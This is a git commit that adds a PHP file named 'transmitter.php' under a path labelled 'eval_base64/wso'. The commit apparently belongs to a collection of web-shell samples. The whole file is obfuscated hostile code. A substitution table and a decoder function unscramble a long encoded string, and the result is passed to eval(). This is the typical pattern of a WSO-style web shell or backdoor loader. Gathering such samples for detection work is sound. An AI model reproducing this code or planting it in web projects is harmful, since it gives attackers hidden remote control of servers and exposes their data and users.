e59b520202829d68b5bb5efff15bec8d9739152a
Rafal <kenorb@gmail.com>
2015-04-17 15:17:04 +0100

    Added eval_base64 wso type.

---
+++ eval_base64/wso/transmitter.php
@@ -0,0 +1,36 @@
+<?php
+$vEL8QJC = Array('1'=>'n', '0'=>'8', '3'=>'q', '2'=>'I', '5'=>'2', '4'=>'L', '7'=>'H', '6'=>'d', '9'=>'T', '8'=>'m', 'A'=>'O', 'C'=>'1', 'B'=>'E', 'E'=>'0', 'D'=>'W', 'G'=>'3', 'F'=>'C', 'I'=>'N', 'H'=>'Y', 'K'=>'b', 'J'=>'i', 'M'=>'5', 'L'=>'h', 'O'=>'Z', 'N'=>'4', 'Q'=>'w', 'P'=>'B', 'S'=>'z', 'R'=>'s', 'U'=>'x', 'T'=>'J', 'W'=>'K', 'V'=>'c', 'Y'=>'U', 'X'=>'p', 'Z'=>'t', 'a'=>'6', 'c'=>'v', 'b'=>'V', 'e'=>'k', 'd'=>'M', 'g'=>'A', 'f'=>'l', 'i'=>'r', 'h'=>'G', 'k'=>'S', 'j'=>'7', 'm'=>'o', 'l'=>'D', 'o'=>'g', 'n'=>'F', 'q'=>'a', 'p'=>'f', 's'=>'Q', 'r'=>'R', 'u'=>'9', 't'=>'u', 'w'=>'j', 'v'=>'X', 'y'=>'e', 'x'=>'y', 'z'=>'P');
+function vE6VKM4($vCST444, $vS6PL1V){$vTFOYL7 = ''; for($i=0; $i < strlen($vCST444); $i++){$vTFOYL7 .= isset($vS6PL1V[$vCST444[$i]]) ? $vS6PL1V[$vCST444[$i]] : $vCST444[$i];}
+return base64_decode($vTFOYL7);}
+$vEXFY7C = 'ThnC6hLpVhnSVxgu2F2GOwbJdSVNADTLHwfLO8HNIhYMd8BQdwIJH9VSH5dNdk2jFomeH5uRKG2ozkgJ25r8'.
+'Ik2jFJreODOL6DUEv5nw6hfcKJgu2F6hqDUfVECLKJVjFJreODOL6DUEvGbSObuLq'.
+'8nN2lEo67TCO9RWThrfO8nCK7rpH5LLV1If6Fgu2F6vqDMeKG6S49BxI9B1AQmWshftqbuSOvsmT5bxV8uxv'.
+'5UcOxVR9fbd9FejFePXK8fpV5bEWF6RK56pOvTxKGTSTxQQW9RWshftqbuSOvsmT5CL'.
+'ynufyhbw6vrXK5Mp6hfZOkVRdFejFePSOvrp6hfZObuRqDCX6FoQW9RWs7If6nuZHD6XHCuU6DuEO'.
+'vIpV1bt6hfZOkoQW9RWshrfO8ftOko1bCIzvCOnYfIT9EN14Fg1dJNC4wB1W9RWF8f8Wh6f6'.
+'nuZHD6XHCuU6DuEOvIpOGPwWFeX27RW2Fgo2hOCK8IEqDut2n699GIEV'.
+'8fQV5ULV5LfVxoeHvTxHveX27RW2Fgo2Fgo2FPxOvrCV8NoqvIpH'.
+'vTxHvemThnxV8nMWkg/2hnxV8nMv5CLVFo1bCIzVGrxqvPSKhn'.
+'SqhbSTxQoThnxV8nMWkga27IEV8fQV5ULV5LfVxoeHvTxHveXAQmo2Fgopsmo2FgoT'.
+'nus9CIY2lEobCIzVGrxqvPSKhnSqhbSWFrpYBu9bFejFJgo2FgevEIz9EZTrkgu2n699GIEV8fQV5ULV5LfVxoe'.
+'vEIz9EZTrkejF1EWF8OCK8IEqDut276SKEUcO5ftWFeoyQmo2FgoqhbLOhbxWF62bnrs4SBtdFgEdl'.
+'so98uE2BOc6DMeTxejFJgo2FPeqDYm2wsQIF2XAQXuFoX86DMw6hfcKJPvYEuSOvrwK5uiqDYmThRR2Fr5WkPjFJgo2FgevEIz9'.
+'EZTrbReqCEozkge6wRW2Fgo27If6hIcK5ZXOkoeqxQoT7HXAQXuFoXXOJoLODCQ67emThnC6hLpVhn'.
+'SVxeX27RW2Fgo2hf8WhfSV5bEWFrpYBu9bnR1VhnSVx66Wkg8TJgmKDsCWFrpYBu9bnR1VhnSVx66WkguzkgeHvbEqnuQH'.
+'vISWkeW2Fgo2Fgo2FPvYEuSOvrwK5uiqDYmKDsCWFrpYEbkbebkDx62bnrsvELzYCs1v'.
+'keR2FrL6vrmvGPLVGdXAQmW2Fgo2hf82FoLqvISOvsmTnul9Eu4kYbKKDsCWFrpYEb'.
+'kbebkDx62bnrsvELzYCs1vkf6WkP0pFgmTnul9Eu4kYbKKDsCWFrpYEbkbebkDx62bnrsvELzYCs1vkf62FBu2'.
+'FrL6vrmvGPLVGdXWsmo2Fgo2Fgo276SKEUcO5ftWFejF1EWF8OCK8IEqDut2hnw6hfc'.
+'KfTlWFeoyQmo2FgoqDHm2YgevCPzYCrKTGgUTCEX27RW2Fgo2Fgo2FgeHkgu2hnxV8nMWgmo2Fgo2Fgo2Fgo2FgJ6DMLK'.
+'DYJ2lE+27PmVnuCK8nZOkoX4gmo2Fgo2Fgo2Fgo2FgJVhLQvGOfV1IXK5NJ2lE+27PmV7OfV1IXK5Nm'.
+'WkQW2Fgo2Fgo2Fgo2Fgo216SKCu5OvTSqDut2JguzJPvYEupbebkYEfz9JQW2Fgo2Fgo'.
+'2Fgo2Fgo21ILO8bZK5rf2JguzJPgqDMXv56f6Fo1V5n8ObuZK5rfTxeW2Fgo2Fgo2FgXAQmo2Fg'.
+'o2Fgo2hbwqh0oV5bxqDnRqvXfWFrLW9RW2Fgo27EoODUSOkPjFJgo'.
+'2Fgo2FgoOvOLKFoevCPzYCrKTGgUTCEXAQmo2FgopsXuF8f8WFPfKvPEyko'.
+'evCPzYCrKT5B1vkeoWsmo2FgoqDHmqvISOvsmThrfO8nCK7rpHDIEqDutWkg8TJP86DMw6hfcK'.
+'fufyhfS67dmT5nw6hfcKJVo4JgeOhb8HvbR6nuLHGrXK5NXWsmo2Fgo'.
+'2Fgo2FrpYBu9bnR1Hk662lEoThrfO8nCK7rpHDIEqDutAQmo2FgoODUSOsm'.
+'o2Fgo2Fgo2FrpYBu9bnR1Hk662lEoTCIfHEftO801AQXXOJoo2DbZV7rMWFrpYBu9bnR1Hk66Wkg8TJP86DMw6hfcK'.
+'fufyhfS67dmT5nw6hfcKJVo4JgevCPzYCrKT5B1vkeoWsmo2FgoH5nRKnuCV5bxv5OCK8dmT5'.
+'nw6hfcKJVo4JgevCPzYCrKT5B1vkejF8bNqvsj';
+eval(vE6VKM4($vEXFY7C, $vEL8QJC));?>
